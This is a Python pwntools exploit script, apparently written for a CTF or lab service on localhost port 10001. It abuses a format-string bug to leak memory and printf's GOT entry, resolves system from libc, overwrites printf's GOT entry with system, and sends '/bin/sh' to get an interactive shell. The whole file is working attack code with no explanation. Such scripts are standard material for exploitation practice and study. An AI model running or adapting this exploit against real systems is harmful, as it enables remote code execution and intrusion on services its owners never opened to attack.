from pwn import *

io = remote('127.0.0.1', '10001')

def get_offset():
	def exec_fmt(payload):
		io.sendline(payload)
		info = io.recv()
		return info
	io = remote('127.0.0.1', '10001')
	io.recvline()
	auto = FmtStr(exec_fmt)
	offset = auto.offset
	io.close()

def dump_memory():
	def dump(start_addr, end_addr):
		result = ""
		while start_addr < end_addr:
			io = remote('127.0.0.1', '10001')
			io.recvline()
			payload = "%9$s.AAA" + p32(start_addr)
			io.sendline(payload)
			data = io.recvuntil(".AAA")[:-4]
			if data == "":
				data = "\x00"
			log.info("leaking: 0x%x --> %s" % (start_addr, data.encode('hex')))
			result += data
			start_addr += len(data)
			io.close()
		return result

	code_bin = dump(0x8048000, 0x8049000)
	with open("code.bin", "wb") as f:
		f.write(code_bin)
		f.close()

printf_got = 0x8049974

def method_1(io):
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	global system_addr

	def get_printf_addr():
		io.recvline()
		payload = "%9$s.AAA" + p32(printf_got)
		io.sendline(payload)
		data = u32(io.recvuntil(".AAA")[:4])
		log.info("printf address: 0x%x" % data)
		return data

	printf_addr = get_printf_addr()
	system_addr = printf_addr - (libc.sym['printf'] - libc.sym['system'])
	log.info("system address: 0x%x" % system_addr)

def method_2(io):
	global system_addr

	def leak(addr):
		io.recvline()
		payload = "%9$s.AAA" + p32(addr)
		io.sendline(payload)
		data = io.recvuntil(".AAA")[:-4] + "\x00"
		log.info("leaking: 0x%x --> %s" % (addr, data.encode('hex')))
		return data

	data = DynELF(leak, 0x08048490)			# Entry point address
	system_addr = data.lookup('system', 'libc')
	printf_addr = data.lookup('printf', 'libc')
	log.info("system address: 0x%x" % system_addr)
	log.info("printf address: 0x%x" % printf_addr)

def pwn():
	method_1(io)
	# method_2(io)

	payload = fmtstr_payload(7, {printf_got: system_addr})
	io.recvline()
	io.sendline(payload)
	io.recv()
	io.sendline('/bin/sh')
	io.interactive()

if __name__=='__main__':
	pwn()
